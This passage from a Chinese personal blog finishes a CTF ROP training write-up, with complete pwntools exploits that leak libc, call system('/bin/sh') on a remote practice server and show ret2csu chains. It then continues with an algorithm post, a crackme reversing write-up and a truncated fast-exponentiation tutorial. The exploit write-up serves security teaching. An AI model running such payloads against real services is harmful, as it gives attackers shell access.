</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">libc = LibcSearcher(<span class="string">"read"</span>, read_GLIBC_addr)</span><br><span class="line">libc.add_condition(<span class="string">"__libc_start_main"</span>,libc_start_main_addr)</span><br></pre></td></tr></table></figure>
<pre><code>得到libc的版本号，就可以用libc.dump(function_name)得到函数的偏移。利用运行时的内存地址减去这个偏移就得到了基址。有了基址，任何知道偏移的函数的地址都可以得到：
</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">libcbase = read_GLIBC_addr - libc.dump(<span class="string">'read'</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">'system'</span>)</span><br></pre></td></tr></table></figure>
<pre><code>不难得到完整的exp
</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'./rop_lev6'</span>)</span><br><span class="line"></span><br><span class="line">plt_write = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">main = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">read_GLIBC = elf.got[<span class="string">'read'</span>]</span><br><span class="line">libc_start_main = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">p = remote(<span class="string">'202.197.58.168'</span>,<span class="number">20006</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"****leak read@GLIBC_2.0_addr and libc_start_main_addr and return to main******"</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'a'</span> * <span class="number">0x8c</span> + p32(plt_write) + p32(main) + p32(<span class="number">1</span>) + p32(read_GLIBC) + p32(<span class="number">4</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">read_GLIBC_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'a'</span> * <span class="number">0x8c</span> + p32(plt_write) + p32(main) + p32(<span class="number">1</span>) + p32(libc_start_main) + p32(<span class="number">4</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">libc_start_main_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> read_GLIBC_addr </span><br><span class="line"><span class="keyword">print</span> libc_start_main_addr</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">"read"</span>, read_GLIBC_addr)</span><br><span class="line">libc.add_condition(<span class="string">"__libc_start_main"</span>,libc_start_main_addr)</span><br><span class="line"></span><br><span class="line">libcbase = read_GLIBC_addr - libc.dump(<span class="string">'read'</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"******* get shell *****"</span></span><br><span class="line">payload2 = <span class="string">'a'</span> * <span class="number">0x8c</span> + p32(system_addr) + p32(main) + p32(binsh_addr)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>7、ROP_LEV7</p>
<pre><code>看图

![1542082926541](C:\WINDOWS\TEMP\1542082926541.png)



可以看到这里只有一个read导致的 overflow，也没有任何的辅助函数可以使用，所以我们要先想办法泄露内存信息，找到system()的值，然后再传递“/bin/sh”给它作参数。最后调用system(“/bin/sh”)。因为原程序使用了write()和read()函数，我们可以通过write()去输出write.got的地址，从而计算出libc.so在内存中的地址。但问题在于write()的参数应该如何传递，因为x64下前6个参数不是保存在栈中，而是通过寄存器传值。我们使用ROPgadget并没有找到类似于pop rdi, ret,pop rsi, ret这样的gadgets。那应该怎么办呢？其实在x64下有一些万能的gadgets可以利用。比如说我们看一下__libc_csu_init()这个函数。一般来说，只要程序调用了libc.so，程序都会有这个函数用来对libc进行初始化操作。
</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">__libc_csu_init proc near               ; DATA XREF: _start+16o</span><br><span class="line">.text:0000000000400650                 push    r15</span><br><span class="line">.text:0000000000400652                 mov     r15d, edi</span><br><span class="line">.text:0000000000400655                 push    r14</span><br><span class="line">.text:0000000000400657                 mov     r14, rsi</span><br><span class="line">.text:000000000040065A                 push    r13</span><br><span class="line">.text:000000000040065C                 mov     r13, rdx</span><br><span class="line">.text:000000000040065F                 push    r12</span><br><span class="line">.text:0000000000400661                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:0000000000400668                 push    rbp</span><br><span class="line">.text:0000000000400669                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:0000000000400670                 push    rbx</span><br><span class="line">.text:0000000000400671                 sub     rbp, r12</span><br><span class="line">.text:0000000000400674                 xor     ebx, ebx</span><br><span class="line">.text:0000000000400676                 sar     rbp, 3</span><br><span class="line">.text:000000000040067A                 sub     rsp, 8</span><br><span class="line">.text:000000000040067E                 call    _init_proc</span><br><span class="line">.text:0000000000400683                 test    rbp, rbp</span><br><span class="line">.text:0000000000400686                 jz      short loc_4006A6</span><br><span class="line">.text:0000000000400688                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400690</span><br><span class="line">.text:0000000000400690 loc_400690:                             ; CODE XREF: __libc_csu_init+54j</span><br><span class="line">.text:0000000000400690                 mov     rdx, r13</span><br><span class="line">.text:0000000000400693                 mov     rsi, r14</span><br><span class="line">.text:0000000000400696                 mov     edi, r15d</span><br><span class="line">.text:0000000000400699                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040069D                 add     rbx, 1</span><br><span class="line">.text:00000000004006A1                 cmp     rbx, rbp</span><br><span class="line">.text:00000000004006A4                 jnz     short loc_400690</span><br><span class="line">.text:00000000004006A6</span><br><span class="line">.text:00000000004006A6 loc_4006A6:                             ; CODE XREF: __libc_csu_init+36j</span><br><span class="line">.text:00000000004006A6                 add     rsp, 8</span><br><span class="line">.text:00000000004006AA                 pop     rbx</span><br><span class="line">.text:00000000004006AB                 pop     rbp</span><br><span class="line">.text:00000000004006AC                 pop     r12</span><br><span class="line">.text:00000000004006AE                 pop     r13</span><br><span class="line">.text:00000000004006B0                 pop     r14</span><br><span class="line">.text:00000000004006B2                 pop     r15</span><br><span class="line">.text:00000000004006B4                 retn</span><br><span class="line">.text:00000000004006B4 __libc_csu_init endp</span><br></pre></td></tr></table></figure>
<pre><code>我们可以看到在0x4006a6地址处有一段我们可以控制rbx,rbp,r12,r13,r14,r15寄存器的代码，之后在地址0x400690处，可以通过三条mov指令间接地控制rdx, rsi,rdi寄存器。并且利用call    qword ptr [r12+rbx*8]执行任意代码。*这时候我们只要再将rbx的值赋值为0，再通过精心构造栈上的数据，我们就可以控制pc去调用我们想要调用的函数了（比如说write函数）。执行完call qword ptr [r12+rbx*8]之后，程序会对rbx+=1，然后对比rbp和rbx的值，如果相等就会继续向下执行并ret到我们想要继续执行的地址。所以为了让rbp和rbx的值相等，我们可以将rbp的值设置为1，因为之前已经将rbx的值设置为0了。大概思路就是这样，我们下来构造ROP链。

首先利用write函数leak函数__libc_start_main的地址
</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#rbx  rbp  r12  r13  r14  r15  rdx=r13 rsi=r14 edi=r15</span></span><br><span class="line"><span class="comment">#write(rdi = edi =r15 =1,rsi = r14 = got_write, rdx = r13 =8)</span></span><br><span class="line">payload1 = <span class="string">'a'</span> * <span class="number">0x88</span></span><br><span class="line">payload1 += p64(<span class="number">0x4006a6</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(got_write) + p64(<span class="number">8</span>) + p64(libc_start_main_got) + p64(<span class="number">1</span>)</span><br><span class="line">payload1 += p64(<span class="number">0x400690</span>)</span><br><span class="line">payload1 += <span class="string">'a'</span> * <span class="number">56</span></span><br><span class="line">payload1 += p64(fun_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'******************sending payload1*****************'</span></span><br><span class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">main_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'main_addr ==&gt; '</span> + hex(main_addr)</span><br></pre></td></tr></table></figure>
<pre><code>查询libc版本号，得到system和&quot;/bin/sh&quot;.
</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libc = LibcSearcher(<span class="string">"__libc_start_main"</span>, main_addr)</span><br><span class="line">system_addr = main_addr - libc.dump(<span class="string">'__libc_start_main'</span>) + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = main_addr - libc.dump(<span class="string">'__libc_start_main'</span>) + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br></pre></td></tr></table></figure>
<pre><code>接下来就是简单的构造getshell的payload的，这时候只需要找一个“pop rdi;ret&quot;段就可以。
</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload3 = <span class="string">'a'</span> * <span class="number">0x88</span></span><br><span class="line">payload3 += p64(<span class="number">0x4006b3</span>) + p64(binsh_addr) + p64(system_addr)</span><br></pre></td></tr></table></figure>
<pre><code>除此之外，还有一种思路就是反复利用__libc_csu_init()函数里面的gadget。可以构造payload2利用read函数将&quot;/bin/sh&quot;读进.bss段。甚至payload3也可以用这一段来实现，只是前两个payload的返回地址必须要是main函数，否则寄存器的值不对，程序流程不对达不到效果。
</code></pre><p>8、ROP_LEV8</p>
<pre><code>讲了这么多，来一个大杂烩检查一下效果是一个不错的选择。这一题就是一个大杂烩啊，满足你的所有可能尝试……
</code></pre><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"so, can you find flag?"</span>);</span><br><span class="line">  foo(<span class="number">305419896</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">foo</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+Ch] [bp-1Ch]@1</span></span><br><span class="line"></span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  result = <span class="built_in">puts</span>(&amp;s);                            <span class="comment">// 这里有一个输出记得处理</span></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">1633771873</span> )</span><br><span class="line">    result = getFlag();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getFlag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+4h] [bp-34h]@1</span></span><br><span class="line">  FILE *stream; <span class="comment">// [sp+2Ch] [bp-Ch]@1</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">"flag"</span>, <span class="string">"r"</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">25</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code>简单分析一下，最显眼的莫过于getFlag函数，可以看出它是直接可以输出我们梦寐以求的flag的。怎么引导程序进入这个函数呢？

显然，我们可以将foo函数的参数更改为&quot;1633771873&quot;,使得if语句成立，自然执行getFlag函数。
</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x1c</span> + <span class="number">0x08</span>) + p32(<span class="number">1633771873</span>)</span><br></pre></td></tr></table></figure>
<pre><code>另外，作为pwn，当然要想到将ret覆盖为getFlag函数的地址这种操作。(事实证明都可行)。
</code></pre><p>还有没有别的可能呢？当然有！</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x1c</span> + <span class="number">0x04</span>) + p32(<span class="number">0x804855B</span>)</span><br></pre></td></tr></table></figure>
<pre><code>想一想，既然我们可以覆盖foo函数原来的参数&quot;305419896&quot;为&quot;1633771873&quot;，为什么不可以，直接用foo函数的地址覆盖ret，自己传入参数&quot;1633771873&quot;来达到目的？
</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x1c</span> + <span class="number">0x04</span>) + p32(<span class="number">0x804859F</span>) + p32(<span class="number">0xabefefab</span>) + p32(<span class="number">1633771873</span>)</span><br></pre></td></tr></table></figure>
<pre><code>再想一下，还有没有别的利用方法呢？

我们到目前是都没用到system(&quot;/bin/sh&quot;)的，其实也是可行的。仍然是泄露一个地址，确定libc版本号，再用工具找出system和&quot;/bin/sh&quot;。构造payload就OK，方法同上。
</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x1c</span> + <span class="number">0x04</span>) + p32(system_addr) + p32(<span class="number">0xabefabef</span>) + p32(binsh_addr)</span><br></pre></td></tr></table></figure>
<pre><code>ROP的构造、利用，灵活度很高，前提是要掌握原理，必须清楚自己构造的payload会产生什么样的效果，为什么会有这样的效果。可能很多时候自己的payload没有达到预期的效果，反复查看exp却找不出什么问题。这时候利用gdb调试是很有必要的。

个人喜欢下面的调试方法，比较方便：
</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p = process(<span class="string">'./test'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'pid'</span> + str(proc.pidof(p))</span><br><span class="line">raw_input(<span class="string">'attach me'</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在得到pid后，只需要再打开一个终端窗口，输入一下命令用gdb调试即可:</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gdb attach pid</span><br></pre></td></tr></table></figure>
<pre><code>至此，ROP入门专项就到这里了。

在这里，很有必要感谢学长学姐的帮助，从搭建平台，到练习过程中的悉心指导，学长学姐们真的用心了。
</code></pre>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/11/21/ROP专项总结/" data-id="cjorg7gto000lt0tvz55qbgu4" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-锋芒不漏" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/11/21/锋芒不漏/" class="article-date">
  <time datetime="2018-11-20T16:17:25.000Z" itemprop="datePublished">2018-11-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/11/21/锋芒不漏/">锋芒不漏</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>#include<iostream></iostream></p>
<p>#include<cstdio></cstdio></p>
<p>#include<algorithm><br>using namespace std;<br>const int maxn=105;<br>int l[maxn],r[maxn];<br>int main()<br>{<br>    int N;<br>    int a,b;<br>    while(~scanf(“%d”,&amp;N))<br>    {<br>        fill(l,l+maxn,0);<br>        fill(r,r+maxn,0);<br>        if(N==0)break;</algorithm></p>
<pre><code>    for(int i=0;i&lt;N;i++)
 {
     //桶排序
    scanf(&quot;%d%d&quot;,&amp;a,&amp;b);
    l[a]++;
    r[b]++;

    int max1=-1;
    int kl=0;
    int kr=100;

    int cntl=l[kl];
    int cntr=r[kr];

    while(kl&lt;=100&amp;&amp;kr&gt;=0)
    {
        if(cntl&amp;&amp;cntr)//匹配值
            max1=max(max1,kl+kr);

         if(cntl==cntr)//本就匹配
        {
            kl++;
            kr--;
            cntl=l[kl];
            cntr=r[kr];
            continue;
        }

     else if(cntl&gt;cntr)
        {
            kr--;
            cntl-=cntr;//优化
            cntr=r[kr];
        }
        else if(cntr&gt;cntl)
        {
            kl++;
            cntr-=cntl;
            cntl=l[kl];
        }

    }
    printf(&quot;%d\n&quot;,max1);
  }
    printf(&quot;\n&quot;);
}

return 0;
</code></pre><p>}</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/11/21/锋芒不漏/" data-id="cjorg7gsb000bt0tvx2956cb1" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/acm-算法/">acm 算法</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-看雪FPC复现" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/11/21/看雪FPC复现/" class="article-date">
  <time datetime="2018-11-20T16:15:55.000Z" itemprop="datePublished">2018-11-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/11/21/看雪FPC复现/">看雪FPC复现</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>很长时间没有在这里记录Writeup了，这次这道题目实在太让我兴奋了。有感而记。</p>
<p>拖进IDA；</p>
<p><img src="F:\blog\source\_posts\看雪FPC复现\1.png" alt=""></p>
<p>惊奇的发现，除了scanf之外，只需要两个函数就执行到了”Bad…..”；</p>
<p>依次查看两个验证函数；</p>
<p>1.sub_401080</p>
<p> <img src="F:\blog\source\_posts\看雪FPC复现\2.png" alt=""></p>
<p> 会发现  a1与v2是恒等的，if 不会成立，也就是永远不会“YouGetIt”</p>
<p>2.sub_4010D0</p>
<p><img src="F:\blog\source\_posts\看雪FPC复现\3.png" alt=""></p>
<p>同样的道理，这里也永远不会”Yougetit”</p>
<p>困惑：这就很不正常了，就是说程序的正常执行流程下，永远不会pass；</p>
<p>暗示，可能需要特殊的输入，改变程序的执行流程（栈溢出）</p>
<p>拖进OD，在scanf入flag后通过观察栈，得知，12个字符恰好覆盖返回地址以上部分。</p>
<p><img src="F:\blog\source\_posts\看雪FPC复现\4.png" alt=""></p>
<p>那么，要把程序带到什么地方呢（用哪个地址来覆盖原来的返回地址）；<br>由于输入的全部是可打印字符，可以在IDA中手动查看可疑的地址字段。发现00413131，是一段很像花指令的东西。</p>
<p><img src="F:\blog\source\_posts\看雪FPC复现\5.png" alt=""></p>
<p>尝试一下，输入‘aaaabbbbcccc11A’;<br>惊奇的发现，程序执行了验证算法，（证实了思路）</p>
<p><img src="F:\blog\source\_posts\看雪FPC复现\6.png" alt=""></p>
<p>由于花指令的存在，我选择了动态调试<br>在OD中开启RUN TRACE,单步跟入调试(F8或者f7跟踪，遇到跳转，jz,jl   可以改变z标志位改变流程，继续跟踪）</p>
<p>最后查看执行过的指令。</p>
<p><img src="F:\blog\source\_posts\看雪FPC复现\7.png" alt=""></p>
<p>拷贝下来，过滤得到有效的指令</p>
<p>分析汇编代码：</p>
<p>add esp,-0x10<br>xor eax,eax<br>mov dword ptr ds:[0x41B034],eax<br>pop eax<br>mov ecx,eax<br>pop eax<br>repne jae short 00413266<br>mov ebx,eax<br>pop eax<br>mov edx,eax<br>mov edx,eax<br>mov eax,ecx<br>sub eax,ebx<br>shl eax,0x2<br>add eax,ecx<br>add eax,edx<br>sub eax,0xEAF917E2</p>
<p>对应的方程：</p>
<p>(x-y0&lt;&lt;2 + x + z == 0xEAF917E2</p>
<p>add eax,ecx<br>sub eax,ebx<br>mov ebx,eax<br>shl eax,1<br>add eax,ebx<br>add eax,ecx<br>mov ecx,eax<br>add eax,edx<br>sub eax,0xE8F508C8</p>
<p>对应的方程：</p>
<p>(x-y) &lt;&lt; 1 + (x-y) + x + z ==0XE8F508C8</p>
<p>mov eax,ecx<br>mov eax,ecx<br>sub eax,edx<br>sub eax,0xC0A3C68</p>
<p>对应的方程：</p>
<p>(x-y) &lt;&lt; 1 + (x-y) + x  - z == 0xC0A3C68</p>
<p>其实就是解三元方程组<br>用Z3求解器，或者在线求解<br>得到x,y,z,在加上’11A’就是flag</p>
<h2 id="Just0For0Fun11A"><a href="#Just0For0Fun11A" class="headerlink" title="Just0For0Fun11A"></a>Just0For0Fun11A</h2>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/11/21/看雪FPC复现/" data-id="cjorg7gro000at0tvjkd3zjyo" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/reverse/">reverse</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-快速幂总结拓展" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/11/21/快速幂总结拓展/" class="article-date">
  <time datetime="2018-11-20T16:14:07.000Z" itemprop="datePublished">2018-11-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/11/21/快速幂总结拓展/">快速幂总结拓展</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>一、快速幂，作为一种求幂次方的高效算法，经常用在各种比赛题目中。以前也碰到过，实践起来也不难，但总会记不清，特此做一下记录。</p>
<p>原理基础篇：</p>
<p>首先，快速幂的思想方法是什么？</p>
<p>没错，是二进制。就我来看，它应用二进制的原理大概可以做出如下简述：</p>
<p>1.首先我们知道，任何一个数都可以表示成二进制（计算机就是如此）。这个事实就提供了一种思路：将n次幂表示为二进制数。例如，n=13,二进制是1101。这样的话，n=8+4+1；实现了将n 分解成可由2的幂级数的和（也就是原m^n分解为乘积(n^13=n^8<em>n^4</em>n^1)）;</p>
<p>2.知道了这种应用，就很容易理解为什么快速幂这么快（logn），它的实现，个人理解就是充分利用已知的结论服务下一步操作。比如，当你求出n^4时，你只需一步 n^8=n^4*n^4 即可。</p>
<p>下面给出一个简单的C++模板:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pow</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> n)</span><span class="comment">//返回值类型根据具体问题可变</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> base=a;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(n!=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(n%<span class="number">2</span>)</span><br><span class="line">            ans*=base;<span class="comment">//当前位置二进制为1，</span></span><br><span class="line">        base*=base;<span class="comment">//实现充分利用已知结果</span></span><br><span class="line">        n/=<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>拓展篇：</p>
<p>学过线代的都知道怎么求矩阵的乘积，相当的有套路，但是却有显得麻烦。尤其是，当你需要对一个方阵求n次方的时候，绝望的不只是你，可能还有计算机。所以就有了优化策略，这种策略就是快速幂，原理一样，只是需要自己实现一个能完成两个方阵相乘的函数即可。</p>
<p>样例如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span 